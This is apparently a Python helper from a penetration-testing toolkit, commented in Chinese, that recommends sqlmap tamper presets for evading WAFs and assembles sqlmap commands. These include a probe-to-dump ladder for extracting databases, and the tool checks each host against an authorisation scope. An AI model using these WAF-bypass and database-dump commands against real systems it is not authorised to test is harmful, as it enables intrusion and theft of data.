#!/usr/bin/env python3
"""sqlmap 知识库 + 命令拼装（来自 SQLMAP-WX 图形解说 + tamper 著译）。

对齐 Playbook：传承/吞库针.md
数据：炼蛊房/sqlmap_kit_data/{tampers,sqlmap_options,presets}.json

不替你乱扫未授权站。`cmdline` / `ladder` 带 --url 过 scope 闸门。
授权内 dump 直接拼；百万级拖号仍先问。

示例:
  python3 炼蛊房/sqlmap_kit.py tamper list
  python3 炼蛊房/sqlmap_kit.py tamper search unicode
  python3 炼蛊房/sqlmap_kit.py recommend --waf cloudflare
  python3 炼蛊房/sqlmap_kit.py guide --q tamper
  python3 炼蛊房/sqlmap_kit.py cmdline --url 'https://授权/a?id=1' -p id \\
      --preset unicode_newline --case <案卷>
  python3 炼蛊房/sqlmap_kit.py ladder --url 'https://授权/a?id=1' -p id --case <案卷>
"""
from __future__ import annotations

import argparse
import json
import shlex
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
DATA = OPS / "sqlmap_kit_data"

if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def load_json(name: str) -> Any:
    p = DATA / name
    if not p.is_file():
        raise SystemExit(f"[err] 缺少数据 {p}，请先入库 xlsx")
    return json.loads(p.read_text(encoding="utf-8"))


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "sqlmap_kit"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not h:
        raise SystemExit("[scope] 无法解析 host")
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝生成可执行扫描命令")


def cmd_tamper_list(_: argparse.Namespace) -> int:
    tampers = load_json("tampers.json")
    for t in tampers:
        tags = ",".join(t.get("tags") or [])
        print(f"{t['script']:28s}  [{tags}]  {(t.get('summary') or '')[:70]}")
    print(f"\n总计 {len(tampers)} 个（著译入库）")
    return 0


def cmd_tamper_show(args: argparse.Namespace) -> int:
    name = args.name.replace(".py", "")
    for t in load_json("tampers.json"):
        if t["script"] == name or t["file"] == name + ".py":
            print(json.dumps(t, ensure_ascii=False, indent=2))
            return 0
    raise SystemExit(f"[err] 未找到 tamper: {name}")


def cmd_tamper_search(args: argparse.Namespace) -> int:
    q = args.q.lower()
    hits = []
    for t in load_json("tampers.json"):
        blob = json.dumps(t, ensure_ascii=False).lower()
        if q in blob:
            hits.append(t)
    if not hits:
        print("[—] 无命中")
        return 1
    for t in hits:
        print(f"{t['script']:28s}  {(t.get('summary') or '')[:90]}")
    print(f"\n命中 {len(hits)}")
    return 0


def resolve_preset(waf: str | None, preset: str | None, dbms: str | None) -> dict[str, Any]:
    presets = load_json("presets.json")
    if preset:
        if preset not in presets:
            raise SystemExit(f"[err] 未知 preset: {preset}；可选: {', '.join(presets)}")
        return {"name": preset, **presets[preset]}
    key = None
    w = (waf or "").lower()
    if "cloudflare" in w or w in ("cf",):
        key = "cloudflare"
    elif "modsecurity" in w or "modsec" in w:
        key = "modsecurity"
    elif "iis" in w or "asp" in w:
        key = "asp_iis"
    elif dbms and "mysql" in dbms.lower():
        key = "mysql"
    elif dbms and ("mssql" in dbms.lower() or "sqlserver" in dbms.lower()):
        key = "mssql"
    else:
        key = "generic_waf"
    return {"name": key, **presets[key]}


def cmd_recommend(args: argparse.Namespace) -> int:
    conf = resolve_preset(args.waf, args.preset, args.dbms)
    tampers = load_json("tampers.json")
    by = {t["script"]: t for t in tampers}
    print(f"preset: {conf['name']}")
    print(f"note:   {conf.get('note')}")
    print("tampers:")
    for s in conf.get("tampers") or []:
        t = by.get(s, {})
        print(f"  - {s}: {(t.get('summary') or '')[:80]}")
    print("extra_flags:", " ".join(conf.get("extra_flags") or []))
    print("\n联用:")
    print("  1) waf_detect.py detect 认 WAF")
    print("  2) waf_sqli_bypass.py mutate/probe（Unicode/%0a，优先于裸 sqlmap）")
    print("  3) sqlmap_kit.py cmdline --preset", conf["name"])
    if args.case:
        out = {
            "ts": _now(),
            "waf": args.waf,
            "dbms": args.dbms,
            "preset": conf,
        }
        p = case_dir(args.case) / "recommend.json"
        p.write_text(json.dumps(out, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        print(f"[ok] {p}")
    return 0


def cmd_guide(args: argparse.Namespace) -> int:
    q = args.q.lower()
    hits = []
    for o in load_json("sqlmap_options.json"):
        blob = json.dumps(o, ensure_ascii=False).lower()
        if q in blob:
            hits.append(o)
    if not hits:
        print("[—] 无命中；可试: tamper / -p / cookie / hpp / batch / level")
        return 1
    for o in hits[:15]:
        print(f"## {o['sheet']}")
        print(f"  flag: {o.get('flag')}")
        if o.get("explain"):
            print(f"  说明: {o['explain'][:160]}")
        for ex in (o.get("examples") or [])[:2]:
            print(f"  例: {ex[:160]}")
        print()
    print(f"显示 {min(15,len(hits))}/{len(hits)}（共 91 专题，原文 xlsx 在 docs/references/）")
    return 0


def cmd_cmdline(args: argparse.Namespace) -> int:
    if args.url:
        ensure_scope(args.url)
    conf = resolve_preset(args.waf, args.preset, args.dbms)
    parts = ["sqlmap"]
    if args.url:
        parts += ["-u", args.url]
    if args.data:
        parts += ["--data", args.data]
    if args.param:
        parts += ["-p", args.param]
    if args.cookie:
        parts += ["--cookie", args.cookie]
    if args.dbms:
        parts += ["--dbms", args.dbms]
    tampers = list(conf.get("tampers") or [])
    if args.tamper:
        tampers = [x.strip() for x in args.tamper.split(",") if x.strip()]
    if tampers:
        parts += ["--tamper", ",".join(tampers)]
    for f in conf.get("extra_flags") or []:
        # already may include --dbms
        if args.dbms and f.startswith("--dbms"):
            continue
        parts.append(f)
    if args.batch:
        parts.append("--batch")
    if args.level is not None:
        parts += ["--level", str(args.level)]
    if args.risk is not None:
        parts += ["--risk", str(args.risk)]
    if args.technique:
        parts += ["--technique", args.technique]
    if args.extra:
        parts += shlex.split(args.extra)

    line = " ".join(shlex.quote(p) if i > 0 and not p.startswith("-") and " " in p else p for i, p in enumerate(parts))
    # cleaner: use shlex.join
    line = shlex.join(parts)
    print(line)
    print("\n# 提醒: 授权站先 waf_sqli_bypass 探针；拉全库前确认 notes/授权范围")
    if args.case:
        out = {
            "ts": _now(),
            "preset": conf["name"],
            "cmdline": line,
            "parts": parts,
            "next": [
                "授权内按 ladder 跑：probe → --dbs → --tables → --columns → --dump",
                "Unicode 墙: 炼蛊房/waf_sqli_bypass.py",
                "认 WAF: 炼蛊房/waf_detect.py",
            ],
        }
        p = case_dir(args.case) / "cmdline.json"
        p.write_text(json.dumps(out, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        print(f"[ok] {p}")
    return 0


def find_sqlmap() -> Path | None:
    for p in (
        ENGINE / "tools" / "arsenal" / "bin" / "sqlmap",
        ENGINE / "tools" / "vendor" / "03-exploit" / "sqlmap" / "sqlmap.py",
    ):
        if p.is_file():
            return p
    return None


def cmd_ladder(args: argparse.Namespace) -> int:
    """nmap/Web 开口后的标准取数阶梯：probe → dbs → tables → columns → dump。"""
    ensure_scope(args.url)
    head = ["sqlmap", "-u", args.url, "--batch"]
    if args.data:
        head += ["--data", args.data]
    if args.param:
        head += ["-p", args.param]
    if args.cookie:
        head += ["--cookie", args.cookie]
    if args.dbms:
        head += ["--dbms", args.dbms]
    if args.tamper:
        head += ["--tamper", args.tamper]
    db = args.db or "<库名>"
    table = args.table or "<表名>"
    steps = [
        ("1-probe", head + ["--smart", "--level=2", "--risk=1"]),
        ("2-dbs", head + ["--dbs"]),
        ("3-tables", head + ["-D", db, "--tables"]),
        ("4-columns", head + ["-D", db, "-T", table, "--columns"]),
        ("5-dump", head + ["-D", db, "-T", table, "--dump", "--exclude-sysdbs"]),
    ]
    bin_hint = find_sqlmap()
    print("# 授权内确认注入后按序执行。百万级拖号先问。")
    print("# 签名墙先: python3 炼蛊房/waf_sqli_bypass.py")
    if bin_hint:
        print(f"# 本库 sqlmap: {bin_hint}")
    for name, parts in steps:
        print(f"\n# {name}")
        print(shlex.join(parts))
    if args.case:
        out = {
            "ts": _now(),
            "url": args.url,
            "db": args.db,
            "table": args.table,
            "steps": [{"name": n, "cmd": shlex.join(p)} for n, p in steps],
            "sqlmap": str(bin_hint) if bin_hint else None,
            "next": "授权内逐级跑；dump 直接做，百万拖号先问",
        }
        p = case_dir(args.case) / "ladder.json"
        p.write_text(json.dumps(out, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
        print(f"\n[ok] {p}")
    return 0


def cmd_presets(_: argparse.Namespace) -> int:
    for k, v in load_json("presets.json").items():
        print(f"{k:18s}  tampers={','.join(v.get('tampers') or [])}")
        print(f"{'':18s}  {v.get('note')}")
    return 0


def main() -> int:
    p = argparse.ArgumentParser(description="sqlmap 著译知识库 + 命令拼装")
    sub = p.add_subparsers(dest="cmd", required=True)

    sp = sub.add_parser("tamper", help="tamper 著译")
    tsp = sp.add_subparsers(dest="tcmd", required=True)
    tsp.add_parser("list").set_defaults(func=cmd_tamper_list)
    s = tsp.add_parser("show")
    s.add_argument("name")
    s.set_defaults(func=cmd_tamper_show)
    s = tsp.add_parser("search")
    s.add_argument("q")
    s.set_defaults(func=cmd_tamper_search)

    sp = sub.add_parser("recommend", help="按 WAF/DBMS 推荐 tamper 组合")
    sp.add_argument("--waf", help="如 cloudflare / modsecurity / 阿里云")
    sp.add_argument("--dbms", help="mysql / mssql")
    sp.add_argument("--preset", help="presets.json 键名")
    sp.add_argument("--case")
    sp.set_defaults(func=cmd_recommend)

    sp = sub.add_parser("guide", help="查 SQLMAP-WX 图形解说专题")
    sp.add_argument("--q", required=True, help="关键词：tamper / cookie / hpp / -p ...")
    sp.set_defaults(func=cmd_guide)

    sp = sub.add_parser("cmdline", help="拼 sqlmap 命令（有 --url 则过授权闸门）")
    sp.add_argument("--url")
    sp.add_argument("--data")
    sp.add_argument("-p", "--param")
    sp.add_argument("--cookie")
    sp.add_argument("--dbms")
    sp.add_argument("--waf")
    sp.add_argument("--preset")
    sp.add_argument("--tamper", help="覆盖推荐，逗号分隔")
    sp.add_argument("--batch", action="store_true", default=True)
    sp.add_argument("--level", type=int)
    sp.add_argument("--risk", type=int)
    sp.add_argument("--technique")
    sp.add_argument("--extra", help="追加原始参数，shlex 解析")
    sp.add_argument("--case")
    sp.set_defaults(func=cmd_cmdline)

    sp = sub.add_parser("ladder", help="probe→dbs→tables→columns→dump 阶梯（过 scope）")
    sp.add_argument("--url", required=True)
    sp.add_argument("--data")
    sp.add_argument("-p", "--param")
    sp.add_argument("--cookie")
    sp.add_argument("--dbms")
    sp.add_argument("--tamper")
    sp.add_argument("-D", "--db")
    sp.add_argument("-T", "--table")
    sp.add_argument("--case")
    sp.set_defaults(func=cmd_ladder)

    sub.add_parser("presets", help="列出预设").set_defaults(func=cmd_presets)

    args = p.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
